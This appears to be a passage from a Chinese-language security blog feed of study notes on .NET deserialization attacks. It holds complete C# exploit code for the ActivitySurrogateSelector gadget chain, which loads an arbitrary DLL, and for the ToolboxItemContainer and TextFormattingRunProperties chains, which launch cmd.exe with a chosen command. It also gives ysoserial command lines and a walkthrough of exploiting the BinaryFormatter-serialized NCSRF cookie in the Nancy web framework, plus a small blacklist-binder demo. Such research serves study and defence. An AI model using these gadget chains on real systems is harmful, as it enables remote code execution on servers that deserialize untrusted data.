class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Collections;</span><br><span class="line">using System.ComponentModel.Design;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Web.UI.WebControls;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line">using NDesk.Options;</span><br><span class="line"></span><br><span class="line">namespace ysoserial.Generators</span><br><span class="line">&#123;</span><br><span class="line">    public class MySurrogateSelector : SurrogateSelector</span><br><span class="line">    &#123;</span><br><span class="line">        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)</span><br><span class="line">        &#123;</span><br><span class="line">            selector = this;</span><br><span class="line">            if (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;);</span><br><span class="line">                return (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return base.GetSurrogate(type, context, out selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [Serializable]</span><br><span class="line">    public class PayloadClass : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        protected byte[] assemblyBytes;</span><br><span class="line">        protected int variant_number = 1;</span><br><span class="line">        public PayloadClass()</span><br><span class="line">        &#123;</span><br><span class="line">            this.assemblyBytes = File.ReadAllBytes(&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        private IEnumerable&lt;TResult&gt; CreateWhereSelectEnumerableIterator&lt;TSource, TResult&gt;(IEnumerable&lt;TSource&gt; src, Func&lt;TSource, bool&gt; predicate, Func&lt;TSource, TResult&gt; selector)</span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;)</span><br><span class="line">              .GetType(&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;)</span><br><span class="line">              .MakeGenericType(typeof(TSource), typeof(TResult));</span><br><span class="line">            return t.GetConstructors()[0].Invoke(new object[] &#123; src, predicate, selector &#125;) as IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        protected PayloadClass(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public List&lt;object&gt; GadgetChains()</span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = null;</span><br><span class="line">            Hashtable ht = null;</span><br><span class="line">            List&lt;object&gt; ls = null;</span><br><span class="line">            List&lt;byte[]&gt; data = new List&lt;byte[]&gt;();</span><br><span class="line">            data.Add(this.assemblyBytes);</span><br><span class="line">            var e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(typeof(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), typeof(Assembly).GetMethod(&quot;GetTypes&quot;));</span><br><span class="line">            var e2 = e1.SelectMany(map_type);</span><br><span class="line">            var e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = new PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;), pds);</span><br><span class="line">            verb = new DesignerVerb(&quot;&quot;, null);</span><br><span class="line">            typeof(MenuCommand).GetField(&quot;properties&quot;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = new List&lt;object&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = new Hashtable();</span><br><span class="line">            ht.Add(verb, &quot;&quot;);</span><br><span class="line">            ht.Add(&quot;&quot;, &quot;&quot;);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(&quot;buckets&quot;, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(&quot;key&quot;, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            for (int i = 0; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                object bucket = keys.GetValue(i);</span><br><span class="line">                object key = fi_key.GetValue(bucket);</span><br><span class="line">                if (key is string)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            return ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public byte[] GadgetChainsToBinaryFormatter()</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;object&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = new MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = new MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            return stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void GetObjectData(SerializationInfo info, StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(&quot;In GetObjectData&quot;);</span><br><span class="line">            info.SetType(typeof(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(&quot;PropertyBagBinary&quot;, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class Exp</span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = new PayloadClass();</span><br><span class="line">            using (MemoryStream memoryStream = new MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                //构建formatter</span><br><span class="line">                SoapFormatter sp1 = new SoapFormatter();</span><br><span class="line">                sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = 0;</span><br><span class="line">                var sp2=new SoapFormatter();</span><br><span class="line">                // var bn=new BinaryFormatter();</span><br><span class="line">                sp2.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ActivitySurrogateSelectorFromFile"><a href="#ActivitySurrogateSelectorFromFile" class="headerlink" title="ActivitySurrogateSelectorFromFile"></a>ActivitySurrogateSelectorFromFile</h2><p>就是动态控制dll文件生成payload恶意  yso已经帮我们实现了  其实就是省去了自己生成dll的过程和payload的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -g ActivitySurrogateSelectorFromFile -f SoapFormatter -c &quot;ExpClass.cs;System.Windows.Forms.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240304172144207.png" alt="image-20240304172144207"></p><p>不限于soapFormatter其他的matter也是可以执行的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/m</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-04</title>
    <link href="https://ke1nys.github.io/posts/d491eeb8.html"/>
    <id>https://ke1nys.github.io/posts/d491eeb8.html</id>
    <published>2024-02-26T06:46:05.000Z</published>
    <updated>2024-03-12T14:41:01.013Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md</a></p><h2 id="Nancy"><a href="#Nancy" class="headerlink" title="Nancy"></a>Nancy</h2><p>Nancy是一个轻量级web框架，其cookie中NCSRF字段使用binaryformatter进行序列化反序列化，造成rce。本文主要讲解其反序列化漏洞及ToolboxItemContainer攻击链。</p><p>直接从GitHub下载nancy的demo案例 <a href="https://github.com/NancyFx/Nancy.Demo.Samples">https://github.com/NancyFx/Nancy.Demo.Samples</a></p><p><img src="../images/image-20240226150317588.png" alt="image-20240226150317588"></p><p>这样就是运行成功了  </p><p><img src="../images/image-20240226202457157.png" alt="image-20240226202457157"></p><p>对这个cookie值进行base64解码后发现</p><p><img src="../images/image-20240226202608165.png" alt="image-20240226202608165"></p><p>发现是使用binaryformatter进行序列化存储cookie </p><p>用yso来生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f binaryformatter -g ToolboxItemContainer -c calc</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240226202741516.png" alt="image-20240226202741516"></p><p><img src="../images/image-20240226202855166.png" alt="image-20240226202855166"></p><p>执行成功</p><p>反序列化点在  Nancy.DefaultObjectSerializer.Deserialize()</p><p><img src="../images/image-20240226204356468.png" alt="image-20240226204356468"></p><h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><p>这里这个yso的链子主要用的是<code>ToolboxItemContainer</code>这个链子</p><p><img src="../images/image-20240226204125307.png" alt="image-20240226204125307"></p><p>实现了ISerializable这个接口  那么等会其Objectdata方法肯定是会用到的</p><p>直接来看ToolboxItemSerializer的反序列化构造函数</p><p><img src="../images/image-20240226204509534.png" alt="image-20240226204509534"></p><p>这里获取序列化字节流  </p><p><img src="../images/image-20240226204726619.png" alt="image-20240226204726619"></p><p>然后在这使用<code>BinaryFormatter</code>进行反序列化  所以我们只需要给<code>ToolboxItemContainer</code>类中的<code>Stream</code>参数传入我们构造的恶意字节流就行了</p><p>这里就得用我们前面学到的<code>ObjectDataProvider</code>和<code>TextFormattingRunProperties</code>了</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NancySerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            <span class="built_in">byte</span>[] vs;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memory = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                binaryFormatter.Serialize(memory, <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">                vs = memory.ToArray();</span><br><span class="line">            &#125;</span><br><span class="line">            ToolboxItemSerializerMarshal toolBox = <span class="keyword">new</span> ToolboxItemSerializerMarshal(vs);</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                binaryFormatter.Serialize(memoryStream, toolBox);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ToolboxItemSerializerMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ToolboxItemSerializerMarshal</span>(<span class="params"><span class="built_in">byte</span>[] payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Payload = payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">byte</span>[] Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(Type.GetType(<span class="string">&quot;System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>));</span><br><span class="line">            info.AddValue(<span class="string">&quot;AssemblyName&quot;</span>, <span class="keyword">new</span> AssemblyName());</span><br><span class="line">            info.AddValue(<span class="string">&quot;Stream&quot;</span>, Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gadget</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            _xaml = gadget(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来讲就是<code>ObjectDataProvider</code>和<code>TextFormattingRunProperties</code>生成payload  然后在序列化的时候讲序列化字节流给<code>ToolboxItemContainer</code>类里的<code>Stream</code>参数赋值</p><p><img src="../images/image-20240226205529437.png" alt="image-20240226205529437"></p><p>这个类是生成xaml的payload  然后在<code>GetObjectData</code>函数中对TextFormattingRunProperties的_xaml参数进行赋值</p><p><img src="../images/image-20240226205738291.png" alt="image-20240226205738291"></p><p><img src="../images/image-20240226205812311.png" alt="image-20240226205812311"></p><p>这个就是我们的本篇文章主要用的类了<code>ToolboxItemContainer</code>   其构造函数和<code>GetObjectData</code>函数就是为了给里面的Stream参数赋值的</p><p><img src="../images/image-20240226205936240.png" alt="image-20240226205936240"></p><p>然后再看起main函数  写的和我们一样   就是先序列化<code>TextFormattingRunPropertiesMarshal</code>这个类  生成字节流  然后再序列化<code>ToolboxItemSerializerMarshal</code>这个类  将Stream参数进行赋值   然后再反序列化就行了</p><p><img src="../images/image-20240226210155219.png" alt="image-20240226210155219"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Nancy.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/Nanc</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-03</title>
    <link href="https://ke1nys.github.io/posts/4af57b1b.html"/>
    <id>https://ke1nys.github.io/posts/4af57b1b.html</id>
    <published>2024-02-25T09:24:49.000Z</published>
    <updated>2024-03-12T14:41:01.010Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/">https://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/</a></p><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md</a></p><p>这一篇文章主要讲的是这个BinaryFormatter</p><h2 id="BinaryFormatter"><a href="#BinaryFormatter" class="headerlink" title="BinaryFormatter"></a>BinaryFormatter</h2><p>这个类其实我们在Dotnet-Deserialization-01的时候就简略的描述过了    他的一些基本参数我们也讲了  序列化的生命周期也讲了   接下来主要讲的就是这个<code>Binder</code>和<code>SurrogateSelector</code></p><p><img src="../images/image-20240225172852335.png" alt="image-20240225172852335"></p><p>Binder就相当于我们java中的<code>resolveclass</code>   可以用来设置反序列化类的黑名单</p><p>SurrogateSelector就是代理器  在01的时候也讲了一下</p><h2 id="Binder-过滤器"><a href="#Binder-过滤器" class="headerlink" title="Binder 过滤器"></a>Binder 过滤器</h2><p>一个简单的demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line">public class CustomSerializationBinder : SerializationBinder</span><br><span class="line">&#123;</span><br><span class="line">    public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">        if (IsTypeInBlacklist(typeName))</span><br><span class="line">        &#123;</span><br><span class="line">            throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 使用默认绑定</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private bool IsTypeInBlacklist(string typeName)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在这里添加黑名单检查的逻辑</span><br><span class="line">        // 返回 true 表示在黑名单中，返回 false 表示不在黑名单中</span><br><span class="line">        return typeName.Contains(&quot;EvilClass&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[Serializable]</span><br><span class="line">public class EvilClass</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Serializable]</span><br><span class="line">public class MyClass</span><br><span class="line">&#123;</span><br><span class="line">    public string Name &#123; get; set; &#125;</span><br><span class="line">    public int Age &#123; get; set; &#125;</span><br><span class="line">    public object data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">        // 创建对象实例</span><br><span class="line">        MyClass myObject = new MyClass &#123; Name = &quot;John&quot;, Age = 25 &#125;;</span><br><span class="line">        var evilClass = new EvilClass();</span><br><span class="line">        myObject.data = evilClass;</span><br><span class="line"></span><br><span class="line">        // 使用BinaryFormatter进行序列化，并设置自定义的SerializationBinder</span><br><span class="line">        BinaryFormatter formatter = new BinaryFormatter();</span><br><span class="line">        formatter.Binder = new CustomSerializationBinder();</span><br><span class="line"></span><br><span class="line">        using (MemoryStream stream = new MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            formatter.Serialize(stream, myObject);</span><br><span class="line"></span><br><span class="line">            // 将流位置重置为开始</span><br><span class="line">            stream.Seek(0, SeekOrigin.Begin);</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                // 使用BinaryFormatter进行反序列化</span><br><span class="line">                MyClass deserializedObject = (MyClass)formatter.Deserialize(stream);</span><br><span class="line"></span><br><span class="line">                // 输出反序列化后的对象属性</span><br><span class="line">                Console.WriteLine($&quot;Name: &#123;deserializedObject.Name&#125;, Age: &#123;deserializedObject.Age&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (SerializationException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                // 处理反序列化异常</span><br><span class="line">                Console.WriteLine($&quot;Error during deserialization: &#123;ex.Message&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240225173905242.png" alt="image-20240225173905242"></p><p>匹配到指定的EvilClass这个类   然后就抛出异常</p><p>这个过程和Java反序列化中的Resolveclass顺序是一致的，先读取当前类的类型，再读取成员变量的类型，最后还原成对象。</p><p>主要的逻辑就是CustomSerializationBinder类中的BindToType方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public override Type BindToType(string assemblyName, string typeName)</span><br><span class="line">&#123;</span><br><span class="line">    // 在反序列化时，检查类型是否在黑名单中</span><br><span class="line">    if (IsTypeInBlacklist(typeName))</span><br><span class="line">    &#123;</span><br><span class="line">        throw new SerializationException(&quot;Deserialization of this type is not allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用默认绑定 </span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(那个SurrogateSelector 代理器这里就不多写了   不了解的可以去看01的那篇文章  有详细的介绍)</p><p><strong>简单来说他的作用就是让本不可以序列化的类可以进行序列化</strong></p><h2 id="TextFormattingRunProperties利用链"><a href="#TextFormattingRunProperties利用链" class="headerlink" title="TextFormattingRunProperties利用链"></a>TextFormattingRunProperties利用链</h2><p>如果没找到这个类报错的话  我们就得手动导入</p><p><img src="../images/image-20240225175352997.png" alt="image-20240225175352997"></p><p><img src="../images/image-20240225175918652.png" alt="image-20240225175918652"></p><p>这个类是继承于这个ISerializable接口的   然后因为没有使用代理器  等会序列化的时候就会调用我们的GetObjectData方法  </p><p><img src="../images/image-20240225180052259.png" alt="image-20240225180052259"></p><p>跟进这个方法</p><p><img src="../images/image-20240225180158967.png" alt="image-20240225180158967"></p><p>发现了我们的老朋友  XamlReader.Parse  并且这个str可控  那么我们就能完成RCE了  